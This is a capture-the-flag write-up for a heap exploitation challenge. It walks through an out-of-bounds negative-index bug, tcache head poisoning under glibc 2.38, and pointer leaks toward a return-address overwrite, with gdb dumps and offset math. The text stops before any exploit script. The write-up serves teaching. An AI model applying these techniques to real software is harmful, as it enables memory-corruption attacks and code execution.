# Solution

So, this is a solution on how to solve this challenge. There are a ton of different ways to solve this challenge, with this being one way.

Do note, this solution relies on hardcoded offsets, which are a result of how the binary was compiled. Likely if you try to run this exploit against a binary you compiled, it will probably not work. You will need to swap out these offsets, in order for it to work.

## Looking at the Program

Starting off, let's take a look at the program to better understand what it is doing.

This is pretty similar to the previous two challenges. The main difference here is the bug. The malloc chunks are treated as arrays, where we can read/write to it, via specifying an index. The bug here, is an index array out of bounds:

```
#include <stdio.h>
#include <stdlib.h>
#include "chall-02.h"

long *chunks[10];
unsigned int chunk_sizes[10];

void main(void) {
    unsigned int menu_choice;

    while (1 == 1) {
   	 puts("Menu:\n1.) Allocate New Chunk\n2.) View Chunk\n3.) Edit Chunk\n4.) Free Chunk\n");
   	 puts("Please enter menu choice:");
   	 menu_choice = get_uint();

   	 if (menu_choice == ALLOCATE) {
   		 allocate_chunk();
   	 }

   	 else if (menu_choice == VIEW) {
   		 view_chunk();
   	 }

   	 else if (menu_choice == EDIT) {
   		 edit_chunk();
   	 }

   	 else if (menu_choice == FREE) {
   		 free_chunk();
   	 }

   	 else if (menu_choice == SECRET) {
   		 secret();
   	 }   	 

   	 else {
   		 printf("Unknown Menu Choice: %d\n", menu_choice);    
   	 }
    }
}

void you_win(void) {
    puts("Call this function to win!");

    puts("\n\nYou Win\n\n");
}

unsigned int get_uint(void) {
    char buf[40];

    fgets(buf, sizeof(buf) - 1, stdin);
    puts("");
    return (unsigned int)atoi(buf);
}

long long get_long(void) {
    char buf[40];

    fgets(buf, sizeof(buf) - 1, stdin);
    puts("");
    return atoll(buf);
}

unsigned int get_chunk_idx(void) {
    unsigned chunk_idx;
    long *chunk;

    puts("Which chunk idx would you like?");
    chunk_idx = get_uint();


    if ((chunk_idx <= MAX_CHUNK_IDX)) {
   	 printf("You choose idx: %u\n\n", chunk_idx);
    }

    else {
   	 puts("Bad Chunk IDX\n");
   	 return -1;
    }

    chunk = chunks[chunk_idx];

    if (chunk == NULL) {
   	 puts("Chunk doesn't exist.\n");
   	 return -1;
    }

    else {
   	 return chunk_idx;
    }

}

void allocate_chunk(void) {
    unsigned int new_chunk_size, chunk_idx;
    long *new_chunk;

    puts("Allocating a new chunk!\n");

    printf("Enter the chunk size between 0x%x-0x%x:\n",
   	 MIN_CHUNK_SIZE, MAX_CHUNK_SIZE);

    new_chunk_size = get_uint();

    if ((new_chunk_size > MIN_CHUNK_SIZE) && (new_chunk_size < MAX_CHUNK_SIZE)) {
   	 printf("Chunk Size: 0x%x\n\n", new_chunk_size);
    }

    else {
   	 puts("You have inputed a bad chunks size.\n");
   	 return;
    }

    puts("Which chunk idx would you like to allocate?");
    chunk_idx = get_uint();

    if ((chunk_idx < MAX_CHUNK_IDX)) {
   	 printf("Choosen chunk idx: 0x%x\n\n", chunk_idx);
    }

    else {
   	 puts("Bad Chunk IDX\n");
   	 return;
    }

    if (chunks[chunk_idx] != NULL) {
   	 puts("Chunk already exists there!\n");
   	 return;
    }

    new_chunk = malloc(new_chunk_size);
    chunks[chunk_idx] = new_chunk;
    chunk_sizes[chunk_idx] = new_chunk_size;

    puts("Chunk has been allocated!\n");

}

void view_chunk(void) {
    unsigned int chunk_idx, chunk_size;
    long *chunk;
    int read_index;

    puts("Viewing a chunk!\n");

    chunk_idx = get_chunk_idx();
    if (chunk_idx == -1) {
   	 puts("Your chunk idx is invalid.\n");
   	 return;
    }

    chunk = chunks[chunk_idx];
    chunk_size = chunk_sizes[chunk_idx];

    puts("What index would you like to see?\n");

    read_index = (int)get_uint();

    if ((int)(read_index * sizeof(long)) >= (int)chunk_size) {
   	 puts("The index is past the end of the boundary.\n");
   	 return;
    }

    printf("Chunk Contents: 0x%lx\n\n", chunk[read_index]);
}

void edit_chunk(void) {
    unsigned int chunk_idx,
   				 chunk_size;

    long long write_value;

    int write_index;

    long *chunk;

    puts("Editing a chunk!\n");

    chunk_idx = get_chunk_idx();
    if (chunk_idx == -1) {
   	 puts("Your chunk idx is invalid.\n");
   	 return;
    }

    chunk = chunks[chunk_idx];
    chunk_size = chunk_sizes[chunk_idx];

    puts("Please input long write index\n");

    write_index = (int)get_uint();

    if ((int)(write_index * sizeof(long)) >= (int)chunk_size) {
   	 puts("The index is past the end of the boundary\n");
   	 return;
    }

    puts("Please input the write value\n");

    write_value = get_long();

    chunk[write_index] = write_value;

    puts("\nChunk has been edited!\n");
}

void free_chunk(void) {
    unsigned int chunk_idx;
    long *chunk;

    puts("Freeing a chunk!\n");

    chunk_idx = get_chunk_idx();
    if (chunk_idx == -1) {
   	 puts("Your chunk idx is invalid.\n");
   	 return;
    }

    chunk = chunks[chunk_idx];
    free(chunk);

    chunks[chunk_idx] = NULL;
    chunk_sizes[chunk_idx] = 0x00;


    puts("Chunk has been freed!\n");
}

void secret(void) {
    unsigned int chunk_idx, choice;
    long *chunk;
    char buf[20];

    chunk_idx = get_chunk_idx();
    if (chunk_idx == -1) {
   	 puts("Your chunk idx is invalid.\n");
   	 return;
    }

    chunk = chunks[chunk_idx];

    puts("Choice?");

    fgets(buf, sizeof(buf) - 1, stdin);
    choice = (unsigned int)atoi(buf);

    if (choice == 0xd3) {
   	 *((unsigned int **)chunk) = (&choice);
    }

    else if (choice == 0x83) {
   	 *((void (**)(void))chunk) = (&secret);
    }
}
```

With this being the header file:

```
#define ALLCOATE 0x00
#define ALLOCATE 0x01
#define VIEW 0x02
#define EDIT 0x03
#define FREE 0x04
#define SECRET 0x05

#define MAX_CHUNK_IDX 10
#define MAX_CHUNK_SIZE 0x5f0
#define MIN_CHUNK_SIZE 0x00

void allocate_chunk();
void view_chunk();
void edit_chunk();
void free_chunk();
void secret();

unsigned int get_uint();
void you_win();
```

We see it has a `allocate/free/view/edit` (and `secret`) functionality similar to the rest. How we edit/view chunks is a bit unique. The chunks are treated as arrays of longs. To edit/view a chunk, we specify an index into that array, to either view or write an index. There is a check, to check that the index times the size of a long does not exceed the size of a chunk. However this size value is a signed integer, and there is no check on the lower bounds of this index. As such, we can use negative indices, in order to view/edit data before the start of the chunk.

So tl;dr, our bug will allow us to read/write data before the start of a chunk.

## How will we pwn this?

Our central goal will still be to use the tcache linked list primitive, in order to allocate a chunk to `chunks`, write a ptr to the stack return address there, and leverage that for RCE. In order to insert our fake chunk into the tcache, we will just use the index array out of bounds in order to overwrite the head ptr.

We will start off via allocating two chunks, with the first one being of size `0x500`. We will use that first chunk, and the `secret` functionality in order to get our stack/pie infoleaks. Then, we will free it, to insert it into the unsorted bin. Since it will be the only chunk in the unsorted bin, it will have a libc ptr for both the fwd/bk ptrs, which we will leak for our libc leak. Originally I was planning on using this libc infoleak, however later decided that there are simpler ways (there will be more work on how to leverage the libc memory space in later writeups).

So at this point, we know the address spaces we need to know. Using our one allocated chunk, we will index backwards to overwrite the tcache head ptr for a bin of a particular size. I will also write a `0x01` to the corresponding tcache bin size value, for that tcache. The next allocation from this bin, should result in a ptr to `chunks`. Also, since it is the head ptr we are overwriting, we don't need to concern ourselves with ptr mangling here.

Before I go ahead and allocate our tcache `chunks` chunk, I will first allocate another valid heap chunk at offset `0x00`. Then I will allocate our `chunks` chunk, and use that to overwrite that valid chunk we just allocated. The reason I allocated a valid chunk there, is to set the corresponding chunk size value, so we didn't have to bother with that. The value I overwrote it with, is that return address. Then I just write to the return address to get code execution, and call the win function, like with the previous two solutions.

One thing to note, we don't need a heap infoleak for this solution. Since this is an index array out of bounds bug, and we have the ability to start from valid heap addresses which we know the offsets from, we don't need to know the exact address. Also, this is due to us not having to deal with ptr mangling with the actual tcache head ptrs.

Here is a list of the offsets that I needed to get, for this exploit to work. I will show you how to get them below:

```
stack_target_dst
pie_base
chunks_address
win_func
libc leak index offset
tcache bin head index offset
tcache bin size index offset
```

Now let's see this in action. To do this, I put in `input` calls into the python3 exploit, and analyzed it in gdb:

```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start          	End            	Offset         	Perm Path
0x000055911df24000 0x000055911df25000 0x0000000000000000 r-- /Hackery/shogun/challs/02/chall-02
0x000055911df25000 0x000055911df26000 0x0000000000001000 r-x /Hackery/shogun/challs/02/chall-02
0x000055911df26000 0x000055911df27000 0x0000000000002000 r-- /Hackery/shogun/challs/02/chall-02
0x000055911df27000 0x000055911df28000 0x0000000000002000 r-- /Hackery/shogun/challs/02/chall-02
0x000055911df28000 0x000055911df29000 0x0000000000003000 rw- /Hackery/shogun/challs/02/chall-02
0x000055911e1cb000 0x000055911e1ec000 0x0000000000000000 rw- [heap]
0x00007febc5e00000 0x00007febc5e22000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007febc5e22000 0x00007febc5f72000 0x0000000000022000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007febc5f72000 0x00007febc5fc8000 0x0000000000172000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007febc5fc8000 0x00007febc5fc9000 0x00000000001c8000 --- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007febc5fc9000 0x00007febc602c000 0x00000000001c8000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007febc602c000 0x00007febc602e000 0x000000000022b000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007febc602e000 0x00007febc603b000 0x0000000000000000 rw-
0x00007febc61cd000 0x00007febc61d2000 0x0000000000000000 rw-
0x00007febc61d2000 0x00007febc61d3000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007febc61d3000 0x00007febc61f9000 0x0000000000001000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007febc61f9000 0x00007febc6203000 0x0000000000027000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007febc6204000 0x00007febc6206000 0x0000000000031000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007febc6206000 0x00007febc6208000 0x0000000000033000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007ffed8831000 0x00007ffed8852000 0x0000000000000000 rw- [stack]
0x00007ffed88f8000 0x00007ffed88fc000 0x0000000000000000 r-- [vvar]
0x00007ffed88fc000 0x00007ffed88fe000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
gef➤  x/10g 0x000055911df28040
0x55911df28040 <chunks>:    0x55911e1cc6c0    0x55911e1ccbd0
0x55911df28050 <chunks+16>:    0x0    0x0
0x55911df28060 <chunks+32>:    0x0    0x0
0x55911df28070 <chunks+48>:    0x0    0x0
0x55911df28080 <chunks+64>:    0x0    0x0
gef➤  x/200g 0x55911e1cc6b0
0x55911e1cc6b0:    0x0    0x511
0x55911e1cc6c0:    0x0    0x0
0x55911e1cc6d0:    0x0    0x0
0x55911e1cc6e0:    0x0    0x0
0x55911e1cc6f0:    0x0    0x0
0x55911e1cc700:    0x0    0x0
0x55911e1cc710:    0x0    0x0
0x55911e1cc720:    0x0    0x0
0x55911e1cc730:    0x0    0x0
0x55911e1cc740:    0x0    0x0
0x55911e1cc750:    0x0    0x0
0x55911e1cc760:    0x0    0x0
0x55911e1cc770:    0x0    0x0
0x55911e1cc780:    0x0    0x0
0x55911e1cc790:    0x0    0x0
0x55911e1cc7a0:    0x0    0x0
0x55911e1cc7b0:    0x0    0x0
0x55911e1cc7c0:    0x0    0x0
0x55911e1cc7d0:    0x0    0x0
0x55911e1cc7e0:    0x0    0x0
0x55911e1cc7f0:    0x0    0x0
0x55911e1cc800:    0x0    0x0
0x55911e1cc810:    0x0    0x0
0x55911e1cc820:    0x0    0x0
0x55911e1cc830:    0x0    0x0
0x55911e1cc840:    0x0    0x0
0x55911e1cc850:    0x0    0x0
0x55911e1cc860:    0x0    0x0
0x55911e1cc870:    0x0    0x0
0x55911e1cc880:    0x0    0x0
0x55911e1cc890:    0x0    0x0
0x55911e1cc8a0:    0x0    0x0
0x55911e1cc8b0:    0x0    0x0
0x55911e1cc8c0:    0x0    0x0
0x55911e1cc8d0:    0x0    0x0
0x55911e1cc8e0:    0x0    0x0
0x55911e1cc8f0:    0x0    0x0
0x55911e1cc900:    0x0    0x0
0x55911e1cc910:    0x0    0x0
0x55911e1cc920:    0x0    0x0
0x55911e1cc930:    0x0    0x0
0x55911e1cc940:    0x0    0x0
0x55911e1cc950:    0x0    0x0
0x55911e1cc960:    0x0    0x0
0x55911e1cc970:    0x0    0x0
0x55911e1cc980:    0x0    0x0
0x55911e1cc990:    0x0    0x0
0x55911e1cc9a0:    0x0    0x0
0x55911e1cc9b0:    0x0    0x0
0x55911e1cc9c0:    0x0    0x0
0x55911e1cc9d0:    0x0    0x0
0x55911e1cc9e0:    0x0    0x0
0x55911e1cc9f0:    0x0    0x0
0x55911e1cca00:    0x0    0x0
0x55911e1cca10:    0x0    0x0
0x55911e1cca20:    0x0    0x0
0x55911e1cca30:    0x0    0x0
0x55911e1cca40:    0x0    0x0
0x55911e1cca50:    0x0    0x0
0x55911e1cca60:    0x0    0x0
0x55911e1cca70:    0x0    0x0
0x55911e1cca80:    0x0    0x0
0x55911e1cca90:    0x0    0x0
0x55911e1ccaa0:    0x0    0x0
0x55911e1ccab0:    0x0    0x0
0x55911e1ccac0:    0x0    0x0
0x55911e1ccad0:    0x0    0x0
0x55911e1ccae0:    0x0    0x0
0x55911e1ccaf0:    0x0    0x0
0x55911e1ccb00:    0x0    0x0
0x55911e1ccb10:    0x0    0x0
0x55911e1ccb20:    0x0    0x0
0x55911e1ccb30:    0x0    0x0
0x55911e1ccb40:    0x0    0x0
0x55911e1ccb50:    0x0    0x0
0x55911e1ccb60:    0x0    0x0
0x55911e1ccb70:    0x0    0x0
0x55911e1ccb80:    0x0    0x0
0x55911e1ccb90:    0x0    0x0
0x55911e1ccba0:    0x0    0x0
0x55911e1ccbb0:    0x0    0x0
0x55911e1ccbc0:    0x0    0x91
0x55911e1ccbd0:    0x0    0x0
0x55911e1ccbe0:    0x0    0x0
0x55911e1ccbf0:    0x0    0x0
0x55911e1ccc00:    0x0    0x0
0x55911e1ccc10:    0x0    0x0
0x55911e1ccc20:    0x0    0x0
0x55911e1ccc30:    0x0    0x0
0x55911e1ccc40:    0x0    0x0
0x55911e1ccc50:    0x0    0x1f3b1
0x55911e1ccc60:    0x0    0x0
0x55911e1ccc70:    0x0    0x0
0x55911e1ccc80:    0x0    0x0
0x55911e1ccc90:    0x0    0x0
0x55911e1ccca0:    0x0    0x0
0x55911e1cccb0:    0x0    0x0
0x55911e1cccc0:    0x0    0x0
0x55911e1cccd0:    0x0    0x0
0x55911e1ccce0:    0x0    0x0
```

First off, we see our two chunks at `0x55911e1ccbd0` and `0x55911e1cc6c0`. Now let's free `0x55911e1cc6c0`, and see the libc ptrs there:

```
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7febc602cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7febc602cca0 ─────────────────────────────
[+] unsorted_bins[0]: fw=0x55911e1cc6b0, bk=0x55911e1cc6b0
 →   Chunk(addr=0x55911e1cc6c0, size=0x510, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 1 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7febc602cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7febc602cca0 ──────────────────────────────
[+] Found 0 chunks in 0 large non-empty bins.
gef➤  x/200g 0x55911e1cc6b0
0x55911e1cc6b0:    0x0    0x511
0x55911e1cc6c0:    0x7febc602cd00    0x7febc602cd00
0x55911e1cc6d0:    0x0    0x0
0x55911e1cc6e0:    0x0    0x0
0x55911e1cc6f0:    0x0    0x0
0x55911e1cc700:    0x0    0x0
0x55911e1cc710:    0x0    0x0
0x55911e1cc720:    0x0    0x0
0x55911e1cc730:    0x0    0x0
0x55911e1cc740:    0x0    0x0
0x55911e1cc750:    0x0    0x0
0x55911e1cc760:    0x0    0x0
0x55911e1cc770:    0x0    0x0
0x55911e1cc780:    0x0    0x0
0x55911e1cc790:    0x0    0x0
0x55911e1cc7a0:    0x0    0x0
0x55911e1cc7b0:    0x0    0x0
0x55911e1cc7c0:    0x0    0x0
0x55911e1cc7d0:    0x0    0x0
0x55911e1cc7e0:    0x0    0x0
0x55911e1cc7f0:    0x0    0x0
0x55911e1cc800:    0x0    0x0
0x55911e1cc810:    0x0    0x0
0x55911e1cc820:    0x0    0x0
0x55911e1cc830:    0x0    0x0
0x55911e1cc840:    0x0    0x0
0x55911e1cc850:    0x0    0x0
0x55911e1cc860:    0x0    0x0
0x55911e1cc870:    0x0    0x0
0x55911e1cc880:    0x0    0x0
0x55911e1cc890:    0x0    0x0
0x55911e1cc8a0:    0x0    0x0
0x55911e1cc8b0:    0x0    0x0
0x55911e1cc8c0:    0x0    0x0
0x55911e1cc8d0:    0x0    0x0
0x55911e1cc8e0:    0x0    0x0
0x55911e1cc8f0:    0x0    0x0
0x55911e1cc900:    0x0    0x0
0x55911e1cc910:    0x0    0x0
0x55911e1cc920:    0x0    0x0
0x55911e1cc930:    0x0    0x0
0x55911e1cc940:    0x0    0x0
0x55911e1cc950:    0x0    0x0
0x55911e1cc960:    0x0    0x0
0x55911e1cc970:    0x0    0x0
0x55911e1cc980:    0x0    0x0
0x55911e1cc990:    0x0    0x0
0x55911e1cc9a0:    0x0    0x0
0x55911e1cc9b0:    0x0    0x0
0x55911e1cc9c0:    0x0    0x0
0x55911e1cc9d0:    0x0    0x0
0x55911e1cc9e0:    0x0    0x0
0x55911e1cc9f0:    0x0    0x0
0x55911e1cca00:    0x0    0x0
0x55911e1cca10:    0x0    0x0
0x55911e1cca20:    0x0    0x0
0x55911e1cca30:    0x0    0x0
0x55911e1cca40:    0x0    0x0
0x55911e1cca50:    0x0    0x0
0x55911e1cca60:    0x0    0x0
0x55911e1cca70:    0x0    0x0
0x55911e1cca80:    0x0    0x0
0x55911e1cca90:    0x0    0x0
0x55911e1ccaa0:    0x0    0x0
0x55911e1ccab0:    0x0    0x0
0x55911e1ccac0:    0x0    0x0
0x55911e1ccad0:    0x0    0x0
0x55911e1ccae0:    0x0    0x0
0x55911e1ccaf0:    0x0    0x0
0x55911e1ccb00:    0x0    0x0
0x55911e1ccb10:    0x0    0x0
0x55911e1ccb20:    0x0    0x0
0x55911e1ccb30:    0x0    0x0
0x55911e1ccb40:    0x0    0x0
0x55911e1ccb50:    0x0    0x0
0x55911e1ccb60:    0x0    0x0
0x55911e1ccb70:    0x0    0x0
0x55911e1ccb80:    0x0    0x0
0x55911e1ccb90:    0x0    0x0
0x55911e1ccba0:    0x0    0x0
0x55911e1ccbb0:    0x0    0x0
0x55911e1ccbc0:    0x510    0x90
0x55911e1ccbd0:    0x0    0x0
0x55911e1ccbe0:    0x0    0x0
0x55911e1ccbf0:    0x0    0x0
0x55911e1ccc00:    0x0    0x0
0x55911e1ccc10:    0x0    0x0
0x55911e1ccc20:    0x0    0x0
0x55911e1ccc30:    0x0    0x0
0x55911e1ccc40:    0x0    0x0
0x55911e1ccc50:    0x0    0x1f3b1
0x55911e1ccc60:    0x0    0x0
0x55911e1ccc70:    0x0    0x0
0x55911e1ccc80:    0x0    0x0
0x55911e1ccc90:    0x0    0x0
0x55911e1ccca0:    0x0    0x0
0x55911e1cccb0:    0x0    0x0
0x55911e1cccc0:    0x0    0x0
0x55911e1cccd0:    0x0    0x0
0x55911e1ccce0:    0x0    0x0
gef➤  vmmap 0x7ffed884fa70
[ Legend:  Code | Heap | Stack ]
Start          	End            	Offset         	Perm Path
0x00007ffed8831000 0x00007ffed8852000 0x0000000000000000 rw- [stack]
gef➤  vmmap 0x55911df25810
[ Legend:  Code | Heap | Stack ]
Start          	End            	Offset         	Perm Path
0x000055911df25000 0x000055911df26000 0x0000000000001000 r-x /Hackery/shogun/challs/02/chall-02
gef➤  vmmap 0x7febc602cd00
[ Legend:  Code | Heap | Stack ]
Start          	End            	Offset         	Perm Path
0x00007febc602c000 0x00007febc602e000 0x000000000022b000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start          	End            	Offset         	Perm Path
0x000055911df24000 0x000055911df25000 0x0000000000000000 r-- /Hackery/shogun/challs/02/chall-02
0x000055911df25000 0x000055911df26000 0x0000000000001000 r-x /Hackery/shogun/challs/02/chall-02
0x000055911df26000 0x000055911df27000 0x0000000000002000 r-- /Hackery/shogun/challs/02/chall-02
0x000055911df27000 0x000055911df28000 0x0000000000002000 r-- /Hackery/shogun/challs/02/chall-02
0x000055911df28000 0x000055911df29000 0x0000000000003000 rw- /Hackery/shogun/challs/02/chall-02
0x000055911e1cb000 0x000055911e1ec000 0x0000000000000000 rw- [heap]
0x00007febc5e00000 0x00007febc5e22000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007febc5e22000 0x00007febc5f72000 0x0000000000022000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007febc5f72000 0x00007febc5fc8000 0x0000000000172000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007febc5fc8000 0x00007febc5fc9000 0x00000000001c8000 --- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007febc5fc9000 0x00007febc602c000 0x00000000001c8000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007febc602c000 0x00007febc602e000 0x000000000022b000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/libc.so.6
0x00007febc602e000 0x00007febc603b000 0x0000000000000000 rw-
0x00007febc61cd000 0x00007febc61d2000 0x0000000000000000 rw-
0x00007febc61d2000 0x00007febc61d3000 0x0000000000000000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007febc61d3000 0x00007febc61f9000 0x0000000000001000 r-x /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007febc61f9000 0x00007febc6203000 0x0000000000027000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007febc6204000 0x00007febc6206000 0x0000000000031000 r-- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007febc6206000 0x00007febc6208000 0x0000000000033000 rw- /home/guy/glibc-2.38/compiled-2.38/lib/ld-linux-x86-64.so.2
0x00007ffed8831000 0x00007ffed8852000 0x0000000000000000 rw- [stack]
0x00007ffed88f8000 0x00007ffed88fc000 0x0000000000000000 r-- [vvar]
0x00007ffed88fc000 0x00007ffed88fe000 0x0000000000000000 r-x [vdso]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 --x [vsyscall]
gef➤  p you_win
$1 = {<text variable, no debug info>} 0x55911df252db <you_win>
```

So we see that the libc ptr at the freed chunk is `0x7febc602cd00` (which we see, it's offset to the libc base is `0x7febc602cd00 - 0x00007febc5e00000 = 0x22cd00`). Using the secret functionality, we get the PIE infoleak `0x55911df25810` (offset from PIE base is `0x1810`), and the stack infoleak `0x7ffed884fa70`. We also see that the offset from the PIE base to the `you_win` function is `0x12db`. The offset to `chunks` is `0x4040` from the PIE base, which we got via the same way we got the offset to `you_win`.

Also, the address we use as a base is `0x55911e1ccbd0` (beginning of the chunk). The `0x7febc602cd00` value is at `0x55911e1cc6c0`. Thus the index we need to view, from that chunk, to get the libc infoleak, is `((0x55911e1cc6c0 - 0x55911e1ccbd0) / 8) = 162`, so just use the index -162. With this, we have all of the infoleaks we need. Let's overwrite the tcache struct:

```
gef➤  x/200g 0x000055911e1cb000
0x55911e1cb000:    0x0    0x291
0x55911e1cb010:    0x0    0x0
0x55911e1cb020:    0x1    0x0
0x55911e1cb030:    0x0    0x0
0x55911e1cb040:    0x0    0x0
0x55911e1cb050:    0x0    0x0
0x55911e1cb060:    0x0    0x0
0x55911e1cb070:    0x0    0x0
0x55911e1cb080:    0x0    0x0
0x55911e1cb090:    0x0    0x0
0x55911e1cb0a0:    0x0    0x0
0x55911e1cb0b0:    0x0    0x0
0x55911e1cb0c0:    0x0    0x0
0x55911e1cb0d0:    0x55911df28040    0x0
0x55911e1cb0e0:    0x0    0x0
0x55911e1cb0f0:    0x0    0x0
0x55911e1cb100:    0x0    0x0
0x55911e1cb110:    0x0    0x0
0x55911e1cb120:    0x0    0x0
0x55911e1cb130:    0x0    0x0
0x55911e1cb140:    0x0    0x0
0x55911e1cb150:    0x0    0x0
0x55911e1cb160:    0x0    0x0
0x55911e1cb170:    0x0    0x0
0x55911e1cb180:    0x0    0x0
0x55911e1cb190:    0x0    0x0
0x55911e1cb1a0:    0x0    0x0
0x55911e1cb1b0:    0x0    0x0
0x55911e1cb1c0:    0x0    0x0
0x55911e1cb1d0:    0x0    0x0
0x55911e1cb1e0:    0x0    0x0
0x55911e1cb1f0:    0x0    0x0
0x55911e1cb200:    0x0    0x0
0x55911e1cb210:    0x0    0x0
0x55911e1cb220:    0x0    0x0
0x55911e1cb230:    0x0    0x0
0x55911e1cb240:    0x0    0x0
0x55911e1cb250:    0x0    0x0
0x55911e1cb260:    0x0    0x0
0x55911e1cb270:    0x0    0x0
0x55911e1cb280:    0x0    0x0
0x55911e1cb290:    0x0    0x411
0x55911e1cb2a0:    0x6520657361656c50    0x6e656d207265746e
0x55911e1cb2b0:    0x6563696f68632075    0x292e320a6b6e0a3a
0x55911e1cb2c0:    0x6843207765695620    0x20292e330a6b6e75
0x55911e1cb2d0:    0x7568432074696445    0x4620292e340a6b6e
0x55911e1cb2e0:    0x6e75684320656572    0xa6b
0x55911e1cb2f0:    0x0    0x0
0x55911e1cb300:    0x0    0x0
0x55911e1cb310:    0x0    0x0
0x55911e1cb320:    0x0    0x0
0x55911e1cb330:    0x0    0x0
0x55911e1cb340:    0x0    0x0
0x55911e1cb350:    0x0    0x0
0x55911e1cb360:    0x0    0x0
0x55911e1cb370:    0x0    0x0
0x55911e1cb380:    0x0    0x0
0x55911e1cb390:    0x0    0x0
0x55911e1cb3a0:    0x0    0x0
0x55911e1cb3b0:    0x0    0x0
0x55911e1cb3c0:    0x0    0x0
0x55911e1cb3d0:    0x0    0x0
0x55911e1cb3e0:    0x0    0x0
0x55911e1cb3f0:    0x0    0x0
0x55911e1cb400:    0x0    0x0
0x55911e1cb410:    0x0    0x0
0x55911e1cb420:    0x0    0x0
0x55911e1cb430:    0x0    0x0
0x55911e1cb440:    0x0    0x0
0x55911e1cb450:    0x0    0x0
0x55911e1cb460:    0x0    0x0
0x55911e1cb470:    0x0    0x0
0x55911e1cb480:    0x0    0x0
0x55911e1cb490:    0x0    0x0
0x55911e1cb4a0:    0x0    0x0
0x55911e1cb4b0:    0x0    0x0
0x55911e1cb4c0:    0x0    0x0
0x55911e1cb4d0:    0x0    0x0
0x55911e1cb4e0:    0x0    0x0
0x55911e1cb4f0:    0x0    0x0
0x55911e1cb500:    0x0    0x0
0x55911e1cb510:    0x0    0x0
0x55911e1cb520:    0x0    0x0
0x55911e1cb530:    0x0    0x0
0x55911e1cb540:    0x0    0x0
0x55911e1cb550:    0x0    0x0
0x55911e1cb560:    0x0    0x0
0x55911e1cb570:    0x0    0x0
0x55911e1cb580:    0x0    0x0
0x55911e1cb590:    0x0    0x0
0x55911e1cb5a0:    0x0    0x0
0x55911e1cb5b0:    0x0    0x0
0x55911e1cb5c0:    0x0    0x0
0x55911e1cb5d0:    0x0    0x0
0x55911e1cb5e0:    0x0    0x0
0x55911e1cb5f0:    0x0    0x0
0x55911e1cb600:    0x0    0x0
0x55911e1cb610:    0x0    0x0
0x55911e1cb620:    0x0    0x0
0x55911e1cb630:    0x0    0x0
gef➤  x/20g 0x55911df28040
0x55911df28040 <chunks>:    0x0    0x55911e1ccbd0
0x55911df28050 <chunks+16>:    0x0    0x0
0x55911df28060 <chunks+32>:    0x0    0x0
0x55911df28070 <chunks+48>:    0x0    0x0
0x55911df28080 <chunks+64>:    0x0    0x0
0x55911df28090:    0x0    0x0
0x55911df280a0 <chunk_sizes>:    0x8000000000    0x0
0x55911df280b0 <chunk_sizes+16>:    0x0    0x0
0x55911df280c0 <chunk_sizes+32>:    0x0    0x0
0x55911df280d0:    0x0    0x0
```

So we see here, the first chunk allocated in the heap is the actual `tcache` (the two arrays of tcache bin sizes and bin head ptrs). As such, the tcache data structure begins at offset `0x10` from the start of the heap, which is `0x55911e1cb000`. This is a way I found out to see where the tcache is allocated, from looking at the code for the `gef` gdb wrapper. I'm unsure if it works this way with multi threaded programs.

That being said, I want to overwrite the bin head for the chunk size `0xa0`, which is the 9th tcache bin (starts at `0x20`, and increases by `0x10` for each one). As such, we will need to write a `0x01` to it's bin size, and the ptr to the bin head location.

The tcache data structure starts at `0x55911e1cb010`. The first array consists of `64` two byte size values, for a total of `2*64 = 0x80` bytes. Since this is the ninth value, and the indices start at `0`, we have to write a `0x01` to `8*2 + 0x55911e1cb010 = 0x55911e1cb020`.

